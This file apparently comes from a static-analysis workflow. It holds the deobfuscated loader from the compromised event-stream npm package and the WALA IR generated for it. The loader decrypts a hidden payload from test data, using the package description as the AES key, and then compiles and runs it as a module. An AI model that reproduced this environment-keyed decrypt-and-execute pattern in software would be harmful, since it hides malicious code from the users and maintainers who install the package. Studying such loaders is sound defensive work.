// Processed by https://github.com/semantic-graph/jsper
function decode(data) { return Buffer.from(data, "hex").toString() }
var n = require("./test/data")
npm_package_description = process['env']['npm_package_description'];
if (npm_package_description) {
    var decipher = require('crypto')['createDecipher']('aes256',npm_package_description)
    decoded = decipher.update(n[0], 'hex', 'utf8');
    decoded += decipher.final('utf8');
    var newModule = new module.constructor;
    // TODO(zhen): these lines are weird...commented out now, investigate later
    // f.paths = module.paths, f[e(n[7])](a, ""), f.exports(n[1])
    // newModule.paths = module.paths, newModule['_compile'](decoded, ""), newModule.exports(n[1])
    // newModule.paths = module.paths
    newModule['_compile'](decoded, "")
    newModule.exports(n[1])
}

/*
WALA IR:

    var n = require("./test/data")

10   v17 = global:global require             eventstream.js [133->140] (line 3)
12   v19 = global:global __WALA__int3rnal__globaleventstream.js [133->155] (line 3)
13   v15 = invoke v17@13 v19,v20:#./test/data exception:v21eventstream.js [133->155] (line 3) [15=[n]]

    npm_package_description = process['env']['npm_package_description'];

15   v25 = global:global process             eventstream.js [182->189] (line 4)
18   v9 = prototype_values(v25)              eventstream.js [182->196] (line 4)
19   v23 = getfield < JavaScriptLoader, LRoot, env, <JavaScriptLoader,LRoot> > v9
                                             eventstream.js [182->196] (line 4)
21   v11 = prototype_values(v23)             eventstream.js [182->223] (line 4)
22   v22 = getfield < JavaScriptLoader, LRoot, npm_package_description, <JavaScriptLoader,LRoot> > v11
                                             eventstream.js [182->223] (line 4)
23   global:global npm_package_description = v22
                                             eventstream.js [156->223] (line 4)
24   v31 = global:global npm_package_description
                                             eventstream.js [229->252] (line 5)
25   check v31                               eventstream.js [229->252] (line 5)

    (to be interpreted):

26   conditional branch(eq, to iindex=-1) v31,v32:#0eventstream.js [225->742] (line 5)
BB8
29   v36 = global:global require             eventstream.js [275->282] (line 6)
30   check v36                               eventstream.js [275->282] (line 6)
BB9
31   v37 = global:global __WALA__int3rnal__globaleventstream.js [275->292] (line 6)
32   v35 = invoke v36@32 v37,v38:#crypto exception:v39eventstream.js [275->292] (line 6) [35=[$$destructure$rcvr4]]
BB10
35   v43 = global:global npm_package_descriptioneventstream.js [320->343] (line 6)
36   check v43                               eventstream.js [320->343] (line 6)
BB11
37   v41 = dispatch v40:#createDecipher@37 v35,v42:#aes256,v43 exception:v44eventstream.js [275->344] (line 6) [41=[decipher, $$destructure$rcvr7]40=[$$destructure$elt4]35=[$$destructure$rcvr4]]
BB12
44   v13 = prototype_values(v15)             eventstream.js [375->379] (line 7) [15=[n]]
45   v49 = fieldref v13.v50:#0.0             eventstream.js [375->379] (line 7)
BB13
46   v48 = dispatch v47:#update@46 v41,v49,v52:#hex,v53:#utf8 exception:v54eventstream.js [359->395] (line 7) [47=[$$destructure$elt6]41=[decipher, $$destructure$rcvr7]]
BB14
47   global:global decoded = v48             eventstream.js [349->395] (line 7)
52   v59 = dispatch v58:#final@52 v41,v53:#utf8 exception:v60eventstream.js [412->434] (line 8) [58=[$$destructure$elt7]41=[decipher, $$destructure$rcvr7]]
BB15
53   v61 = global:global decoded             eventstream.js [401->434] (line 8)
54   check v61                               eventstream.js [401->434] (line 8)
BB16
56   v63 = binaryop(add) v61 , v59           eventstream.js [401->434] (line 8)
57   global:global decoded = v63             eventstream.js [401->434] (line 8)
58   v67 = global:global module              eventstream.js [460->466] (line 9)
59   check v67                               eventstream.js [460->466] (line 9)
BB17
61   v27 = prototype_values(v67)             eventstream.js [460->478] (line 9)
62   v65 = getfield < JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > v27eventstream.js [460->478] (line 9)
BB18
63   v64 = construct v65@63 exception:v70    eventstream.js [456->478] (line 9) [64=[newModule, $$destructure$rcvr14]]
BB19
65   v72 = global:global module              eventstream.js [494->500] (line 10)
66   check v72                               eventstream.js [494->500] (line 10)
BB20
68   v29 = prototype_values(v72)             eventstream.js [494->506] (line 10)
69   v71 = getfield < JavaScriptLoader, LRoot, paths, <JavaScriptLoader,LRoot> > v29eventstream.js [494->506] (line 10)
BB21
70   v76 = global:global f                   eventstream.js [484->485] (line 10)
71   check v76                               eventstream.js [484->485] (line 10)
BB22
72   fieldref v76.v73:#paths = v71 = v71     eventstream.js [484->506] (line 10)
BB23
75   v79 = global:global f                   eventstream.js [508->509] (line 10) [79=[$$destructure$rcvr8]]
76   check v79                               eventstream.js [508->509] (line 10) [79=[$$destructure$rcvr8]]
BB24
78   v82 = global:global e                   eventstream.js [510->511] (line 10)
79   check v82                               eventstream.js [510->511] (line 10)
BB25
80   v83 = global:global __WALA__int3rnal__globaleventstream.js [510->517] (line 10)
82   v33 = prototype_values(v15)             eventstream.js [512->516] (line 10) [15=[n]]
83   v84 = fieldref v33.v85:#7.0             eventstream.js [512->516] (line 10)
BB26
84   v80 = invoke v82@84 v83,v84 exception:v87eventstream.js [510->517] (line 10) [80=[$$destructure$elt8]]
BB27
86   v90 = global:global a                   eventstream.js [519->520] (line 10)
87   check v90                               eventstream.js [519->520] (line 10)
BB28
88   v88 = dispatch v80@88 v79,v90,v91:# exception:v92eventstream.js [508->525] (line 10) [80=[$$destructure$elt8]79=[$$destructure$rcvr8]]
BB29
91   v95 = global:global f                   eventstream.js [527->528] (line 10) [95=[$$destructure$rcvr10]]
92   check v95                               eventstream.js [527->528] (line 10) [95=[$$destructure$rcvr10]]
BB30
96   v34 = prototype_values(v15)             eventstream.js [537->541] (line 10) [15=[n]]
97   v98 = fieldref v34.v99:#1.0             eventstream.js [537->541] (line 10)
BB31
98   v97 = dispatch v96:#exports@98 v95,v98 exception:v101eventstream.js [527->542] (line 10) [96=[$$destructure$elt14]95=[$$destructure$rcvr10]]
BB32
99   v103 = global:global module             eventstream.js [565->571] (line 11)
100   check v103                             eventstream.js [565->571] (line 11)
BB33
102   v45 = prototype_values(v103)           eventstream.js [565->577] (line 11)
103   v102 = getfield < JavaScriptLoader, LRoot, paths, <JavaScriptLoader,LRoot> > v45eventstream.js [565->577] (line 11)
BB34
104   fieldref v64.v73:#paths = v102 = v102  eventstream.js [547->577] (line 11) [64=[newModule, $$destructure$rcvr14]]
BB35
109   v109 = global:global decoded           eventstream.js [601->608] (line 11)
110   check v109                             eventstream.js [601->608] (line 11)
BB36
111   v108 = dispatch v107:#_compile@111 v64,v109,v91:# exception:v110eventstream.js [579->613] (line 11) [107=[$$destructure$elt13]64=[newModule, $$destructure$rcvr14]]
BB37
117   v46 = prototype_values(v15)            eventstream.js [633->637] (line 11) [15=[n]]
118   v114 = fieldref v46.v99:#1.0           eventstream.js [633->637] (line 11)
BB38
119   v113 = dispatch v96:#exports@119 v64,v114 exception:v116eventstream.js [615->638] (line 11) [96=[$$destructure$elt14]64=[newModule, $$destructure$rcvr14]]
BB39
120   v118 = global:global module            eventstream.js [661->667] (line 12)
121   check v118                             eventstream.js [661->667] (line 12)
BB40
123   v51 = prototype_values(v118)           eventstream.js [661->673] (line 12)
124   v117 = getfield < JavaScriptLoader, LRoot, paths, <JavaScriptLoader,LRoot> > v51eventstream.js [661->673] (line 12)
BB41
125   fieldref v64.v73:#paths = v117 = v117  eventstream.js [643->673] (line 12) [64=[newModule, $$destructure$rcvr14]]
BB42
130   v123 = global:global decoded           eventstream.js [700->707] (line 13)
131   check v123                             eventstream.js [700->707] (line 13)
BB43
132   v122 = dispatch v107:#_compile@132 v64,v123,v91:# exception:v124eventstream.js [678->712] (line 13) [107=[$$destructure$elt13]64=[newModule, $$destructure$rcvr14]]
BB44
138   v56 = prototype_values(v15)            eventstream.js [735->739] (line 14) [15=[n]]
139   v128 = fieldref v56.v99:#1.0           eventstream.js [735->739] (line 14)
BB45
140   v127 = dispatch v96:#exports@140 v64,v128 exception:v130eventstream.js [717->740] (line 14) [96=[$$destructure$elt14]64=[newModule, $$destructure$rcvr14]]
BB46

 */